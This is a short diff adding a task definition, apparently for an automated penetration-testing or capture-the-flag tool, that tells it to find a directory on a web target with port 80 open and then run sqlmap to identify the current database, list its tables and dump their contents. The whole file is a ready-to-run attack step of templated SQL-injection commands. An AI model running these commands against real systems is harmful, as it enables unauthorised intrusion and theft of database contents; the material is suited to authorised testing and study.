@@ -1,0 +1,15 @@
+description: look for db's name and users by sqlmap
+function: magic_function
+argument: []
+In: [IP]
+condition: 
+  - 80 in Port
+Out: []
+hint: 
+  - traverse the directory and find the interesting one
+  - "[INPUT]directory"
+  - "[EXE]sqlmap -u http://{Data['IP']}/{Data['directory']} --batch --current-db"
+  - "[INPUT]db_name"
+  - Now let's take a look at its table and dump the contents
+  - "[EXE]sqlmap -u http://{Data['IP']}/{Data['directory']} --batch -D {Data['db_name']} --tables"
+  - "[EXE]sqlmap -u http://{Data['IP']}/{Data['directory']} --batch -D {Data['db_name']} --dump"
